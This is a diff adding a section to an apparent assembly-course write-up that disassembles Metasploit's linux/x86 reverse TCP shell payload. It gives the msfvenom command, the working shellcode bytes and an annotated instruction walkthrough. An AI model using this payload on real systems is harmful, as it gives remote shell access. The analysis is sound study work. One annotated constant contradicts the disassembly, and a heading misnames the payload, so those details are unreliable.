@@ -259,6 +259,146 @@ Some things we picked up for our future code writing:
 + utilizing `socketcall()` instead of separate syscalls
 + utilizing the `xchg` opcode
 
+## Analyzing Shellcode #1 (`linux/x86/reverse_bind_tcp`)
+
+The first thing we need to do is generate the shellcode that corresponds with this MSF payload. We'll need to add arguments as well, such as designate a listening port. We can do this with the following command: `msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=5555 -f c`
+
+```terminal_session
+root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=5555 -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of c file: 311 bytes
+unsigned char buf[] = 
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
+"\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+```
+
+Run our ndisasm command:
+```terminal_session
+root@kali:~# echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x15\xb3\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80" |ndisasm -u -
+```
+
+This time we won't `awk` out just the assembly since last time it made things harder without as much context. 
+
+Output:
+```terminal_session
+00000000  31DB              xor ebx,ebx
+00000002  F7E3              mul ebx
+00000004  53                push ebx
+00000005  43                inc ebx
+00000006  53                push ebx
+00000007  6A02              push byte +0x2
+00000009  89E1              mov ecx,esp
+0000000B  B066              mov al,0x66
+0000000D  CD80              int 0x80
+0000000F  93                xchg eax,ebx
+00000010  59                pop ecx
+00000011  B03F              mov al,0x3f
+00000013  CD80              int 0x80
+00000015  49                dec ecx
+00000016  79F9              jns 0x11
+00000018  687F000001        push dword 0x100007f
+0000001D  68020015B3        push dword 0xb3150002
+00000022  89E1              mov ecx,esp
+00000024  B066              mov al,0x66
+00000026  50                push eax
+00000027  51                push ecx
+00000028  53                push ebx
+00000029  B303              mov bl,0x3
+0000002B  89E1              mov ecx,esp
+0000002D  CD80              int 0x80
+0000002F  52                push edx
+00000030  686E2F7368        push dword 0x68732f6e
+00000035  682F2F6269        push dword 0x69622f2f
+0000003A  89E3              mov ebx,esp
+0000003C  52                push edx
+0000003D  53                push ebx
+0000003E  89E1              mov ecx,esp
+00000040  B00B              mov al,0xb
+00000042  CD80              int 0x80
+```
+
+Alright, let's analyze this code. As you have probably already figured out, they're using `socketcall()` again. This should be familiar territory for us at this point. 
+
+#### Syscall 1 `socketcall()` with `SYS_SOCKET`
+
+Let's keep in mind the argument structure for `SYS_SOCKET`: `socket(PF_INET (2), SOCK_STREAM (1), IPPROTO_IP (0))`
+
+```nasm
+xor ebx,ebx         ; clear out ebx
+mul ebx             ; clear out eax and edx
+push ebx            ; pushing 0 onto stack for the IPPROTO_IP
+inc ebx             ; pushing 1 onto the stack for SOCK_STREAM
+push ebx  
+push byte +0x2      ; pushing 2 onto the stack for PF_INET
+mov ecx,esp         ; $ecx has to point at our args location
+mov al,0x66  
+int 0x80
+xchg eax,ebx        ; storing the sockfd in ebx   
+```
+
+We are getting good at this! Most of this makes sense to us at this point and matches up nicely with our bind shell analysis. 
+
+### Syscall 2 `dup2()`
+
+This is interesting, it looks like this code calls `dup2()` before `connect()` which is different from our code. 
+
+```nasm
+mov al,0x3f   ; 0x3f is the value for dup2
+int 0x80      ; call dup2
+dec ecx       ; decrese counter register
+jns 0x11      ; jump near if not sign
+```
+
+This is a similar set-up to our `dup2()` loop in the MSF bind shell that we evaluated. `0x11` here is just a reference to the location of that first instruction `mov al,0x3f` so as it loops through its iterations if the `jns` condition is not satisfied it will continue to loop. Here's the relevant line from the ndisasm dump:
+```terminal_session
+00000011  B03F              mov al,0x3f
+```
+
+### Syscall 3 `socketcall()` with `connect()`
+
+`connect()` behaves very similarly to `bind()` so keep in mind the argument structure for both, particularly the struct portion: `int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)`.
+
+```nasm
+push dword 0x100007f      ; pushing 127.0.0.1 remote IP 
+push dword 0xb3150002     ; pushing port 5555 and AF_INET 
+mov ecx,esp               ; pointing $ecx to the struct's location on the stack
+mov al,0x66               ; socketcall()
+push eax                  
+push ecx                  ; sockaddr_in* addr 
+push ebx                  ; pushing the sockfd
+mov bl,0x3                ; SYS_CONNECT
+mov ecx,esp  
+int 0x80  
+```
+
+This is all pretty familiar to the code we analyzed for the MSF bind payload. 
+
+### Syscall 3 `execve()`
+
+This is similar to the MSF bind payload we analyzed, but not identical. 
+
+```nasm
+push edx                  ; pushing a null terminator onto the stack
+push dword 0x68732f6e     ; pushing 'hs//' onto the stack
+push dword 0x6e69622f     ; pushing 'nib/' onto the stack, now we have /bin//sh on the stack!
+mov ebx,esp               ; preserving this stack pointer in $ebx
+push edx                  ; another null terminator
+push ebx                  ; the stack pointer address we had stored in $ebx
+mov ecx,esp               ; $ecx has to have the address of the stack pointer for our completed args
+mov al,0xb                ; execve()
+int 0x80
+```
+
+All in all there were the same lessons learned. It emphasizes more succicnt assembly. Why use 3 lines of code when you can accomplish the same goal in 2? There are definitely some areas we can improve our code going forward. 
+
+## Analyzing Shellcode #3 (`linux/x86/exec`)
+
 
 
 
